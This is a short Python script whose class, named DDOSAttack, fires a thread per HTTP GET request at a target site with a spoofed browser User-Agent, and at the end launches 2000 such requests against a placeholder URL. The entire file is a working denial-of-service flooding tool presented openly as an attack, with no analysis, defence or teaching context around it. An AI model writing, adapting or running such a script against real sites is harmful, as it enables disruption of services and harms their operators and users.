import requests
import threading

class DDOSAttack:
    def __init__(self, website: str, num_requests: int):
        self.website = website
        self.num_requests = num_requests

    def send_request(self):
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36'}
        response = requests.get(self.website, headers=headers)
        return response.text

    def send_requests(self):
        for _ in range(self.num_requests):
            thread = threading.Thread(target=self.send_request)
            thread.start()

# Creating an instance of DDOSAttack to perform the attack
ddos_attack = DDOSAttack("https://www.example.com", 2000)
ddos_attack.send_requests()
